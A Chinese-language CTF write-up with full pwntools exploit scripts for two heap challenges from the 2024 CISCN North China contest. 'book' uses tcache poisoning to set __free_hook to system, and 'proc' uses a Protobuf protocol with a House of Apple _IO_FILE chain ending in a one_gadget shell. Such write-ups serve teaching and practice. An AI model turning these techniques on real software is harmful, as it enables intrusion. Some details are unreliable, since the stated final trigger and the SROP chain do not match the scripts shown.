---
title: UKFC2024 CISCN 华北赛区 pwn 方向 WP
contest: UKFC2024 / CISCN 华北
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [book-manager, tcache-poisoning, free-hook-system, protobuf, house-of-apple, setcontext-srop, largebin-attack]
attack_chain:
- book: 4 菜单 (add/show/edit/delete) 经典堆题
- add(0x4f8, 'a') + add(0x38, 'b') + add(0x4f8, 'c') + add(0x38, '/bin/sh')
- delete(0); edit(1, 'a'*0x30 + p64(0x540)) 制造 fake size
- delete(2) 触发 unsorted bin 残余
- add(0x4f8, 'a'); show(1) 泄 libc → __free_hook = system
- add(4, 0x38, 'd'); delete(4) 触发 tcache 残余
- edit(1, p64(leak + __free_hook)); add(5, 0x38, 'aa'); add(6, 0x38, p64(system))
- free 触发 system('/bin/sh')
- proc: Protobuf 序列化 msg { content, idx, size }
- 5 菜单 (add/show/edit/delete/exit) 走 Protobuf 协议
- add(0x540, 'aaa') + add(0x530, 'bbb') → unsorted bin 泄 libc
- setcontext+61 + _IO_wfile_jumps 链 House of Apple
- edit(0, 0x1f, p64(0)*3 + p64(io_all-0x20)) 改 _IO_list_all
- delete(7) 触发 exit flush → 调 _IO_wfile_overflow → SROP
- 0xe3b01 one_gadget 弹 shell
key_payload: tcache poisoning __free_hook = system
one_liner: UKFC2024 CISCN 华北 pwn 2 题：book tcache poisoning + proc Protobuf 序列化 House of Apple SROP。
lesson: Protobuf 序列化通信的程序，size 字段是 sint64/2 实际大小；House of Apple 配合 setcontext+61 是 libc-2.35 主流打法。
quality: high
---
# UKFC2024 CISCN 华北 pwn 方向 WP

## 1. book (简单堆)
```python
from pwn import *
p = remote('8.147.133.173', 44514)
elf = ELF("./book"); libc = elf.libc

def cmd(idx): p.sendlineafter(b'(4) delete a book', str(idx))
def add(idx, size, cnt):
    cmd(1); p.sendlineafter(b'Index:', str(idx))
    p.sendlineafter(b'Size:', str(size))
    p.sendlineafter(b'Content:', cnt)
def show(idx): cmd(2); p.sendlineafter(b'Index:', str(idx))
def edit(idx, cnt): cmd(3); p.sendlineafter(b'ndex:', str(idx)); p.sendafter(b'Content:', cnt)
def delete(idx): cmd(4); p.sendlineafter(b'Index:', str(idx))

# 经典 tcache poisoning
add(0, 0x4f8, b'a')
add(1, 0x38, b'b')
add(2, 0x4f8, b'c')
add(3, 0x38, b'/bin/sh')
delete(0)
edit(1, b'a'*0x30 + p64(0x540))  # 改 fake size
delete(2)
add(0, 0x4f8, b'a')
show(1)
leak = u64(p.recv(6).ljust(8, b'\x00')) - (0x71dee3febca0 - 0x71dee3c00000)
add(4, 0x38, b'd')
delete(4)  # tcache 残余
edit(1, p64(leak + libc.symbols['__free_hook']))
add(5, 0x38, b'aa')
add(6, 0x38, p64(leak + libc.symbols['system']))
p.interactive()
```

## 2. proc (Protobuf + House of Apple)
```protobuf
syntax = "proto2";
package ctf;
message msg {
    required bytes content = 3;
    required int64 idx = 2;
    required sint64 size = 1;
}
```

### 攻击流程
```python
import ctf_pb2

def add(msgsize, msgcontent=b''):
    d = ctf_pb2.msg()
    d.idx = 0
    d.size = msgsize // 2  # 实际字节 / 2
    d.content = msgcontent
    strs = d.SerializeToString()
    p.sendafter(menu, strs)
    cmd(1)
# ... delete/show/edit 类似

# Step 1: 泄 libc
add(0x540, b'aaa')  # 0
add(0x530, b'bbb')  # 1
delete(0); show(0)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - (0x7f44c80bfbe0 - 0x7f44c7ed3000)

lock = libc_base + (0x7c0e66f2d7d0 - 0x7c0e66d3f000)
wfile = libc_base + libc.sym['_IO_wfile_jumps']
setcontext = libc_base + libc.symbols['setcontext'] + 61
io_all = libc_base + libc.sym['_IO_list_all']

# Step 2: 构造 House of Apple fake _IO_FILE
add(0x540, b'ccc')  # 2
add(0x460, b'ggg')  # 3
add(0x550, b'ajsdbjabkjs')  # 4
add(0x460, b'hhh')  # 5
add(0x530, b'h')  # 6
delete(3); delete(5)
show(5)
heap = u64(p.recv(6).ljust(8, b'\x00')) - (0x6207b8bf8d80 - 0x6207b8bf8000)
heap += 0x58d7e5b8b100 - 0x58d7e5b89000

# Step 3: House of Apple payload
pl = b'a'*0x20 + p64(0)*3  # 2e0
pl += p64(0)
pl += p64(0)*7
pl += p64(lock)  # _lock
pl += p64(0)*2
pl += p64(heap + 0xe0)
pl += p64(0)*6
pl += p64(wfile)  # __GI__IO_wfile_jumps
pl += p64(0)*0x1c
pl += p64(heap + 0xe0 + 0xe8)  # _IO_jump_t
pl += p64(0)*0xd
pl += p64(libc_base + 0xe3b01)  # one_gadget

add(0x530, pl)  # 7
delete(0)  # 触发 unsorted bin
add(0x550, b'aaaa')  # 8
edit(0, 0x1f, p64(0)*3 + p64(io_all - 0x20))  # 改 _IO_list_all
delete(7)
add(0x550, b'kkkk')  # 9
p.interactive()
```

### 关键点
- Protobuf 序列化通信，size 字段是 `msgsize // 2`
- House of Apple: setcontext+61 (跳过 mov rdx, [rdi+0xa0]) + _IO_wfile_jumps
- 0xe3b01 one_gadget (libc-2.35 通用)
